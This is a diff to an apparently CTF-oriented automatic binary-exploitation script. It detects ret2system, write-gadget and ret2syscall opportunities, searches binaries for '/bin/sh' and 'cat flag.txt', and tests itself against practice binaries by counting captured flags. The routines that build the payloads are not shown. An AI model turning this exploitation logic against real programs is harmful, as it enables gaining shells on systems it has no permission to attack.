@@ -15,6 +15,7 @@ def handle_exploits(binary):
     win = False
     libc_leak = None
     syscall = None
+    binsh = None
 
     if printf == "array":
         print("[*] Array abuse detected.")
@@ -105,9 +106,23 @@ def handle_exploits(binary):
             flag = e.ret2execve(binary, use_angr=True)
 
         return flag.decode()
+    
+    try:
+        binsh = next(e.pwnelf.search(b"/bin/sh"))
 
-    # check for "system" in pwnelf.plt -- ret2system 
-    if "system" in e.pwnelf.plt.keys():
+    except:
+        pass
+    
+    try:
+        binsh = next(e.pwnelf.search(b"cat flag.txt"))
+
+    except:
+        pass
+    
+
+
+    # check for "system" in pwnelf.plt -- ret2system or write gadgets
+    if "system" in e.pwnelf.plt.keys() and binsh:
         print("[*] ret2system detected.")
 
         flag = e.ret2system(binary)
@@ -123,12 +138,29 @@ def handle_exploits(binary):
 
         return flag.decode()
 
-    # syscall gadget -- ret2syscall 
+    elif "system" in e.pwnelf.plt.keys():
+        print("[*] Write gadgets detected.")
+
+        flag = e.write_gadgets(binary)
+
+        if not flag:
+            print("[*] Trying without a ret")
+
+            flag = e.write_gadgets(binary, add_ret=False)
+
+        if not flag:
+            # bruh
+            pass
+
+        return flag.decode()
+
+    # syscall gadget -- ret2syscall
     for file, gadget in e.rs.search(search="syscall"):
         if "syscall;" in str(gadget):
             syscall = int(str(gadget).split(":")[0], 16)
             break
 
+    
     if syscall:
         print("[*] ret2syscall detected.")
 
@@ -150,8 +182,11 @@ def handle_exploits(binary):
             flag = e.ret2syscall(binary, syscall, 3)
 
         return flag.decode()
+    
+    
+    print("[!] Exploit detection error! Returning None.")
 
-    # write gadget -- write gadgets -- order subject to change
+    return None
 
 # ================ TESTING GROUNDS ===================
 
@@ -160,21 +195,26 @@ def test_category(category):
     bins = [ f"./ace-student/test-bins/{category}-{i}" for i in range(10) ]
     count = 0
     start = time.time()
-    flags = []
+    failed = []
 
     for binary in bins:
         print("========== " + binary)
+        
         try:
             flag = handle_exploits(binary)
-            flags.append(flag)
 
             if flag == "flag{your_mom_is_very_beautiful_to_me}":
                 count += 1
 
+            else:
+                failed.append(binary)
+
         except:
+            failed.append(binary)
             pass
 
     end = time.time()
+    print(failed)
     print(f"==== Test conclusion: {count}/10 in {round(end - start, 2)} seconds. ====")
 
     return [count, round(end - start, 2)]
@@ -217,8 +257,8 @@ def deep_test():
     print("=========================================")
 
 
-#test_category("bin-got-overwrite")
-deep_test()
+#test_category("bin-ret2system")
+#deep_test()
 
 #flag = handle_exploits("./ace-student/test-bins/bin-printf-write-var-0")
 #print(flag)
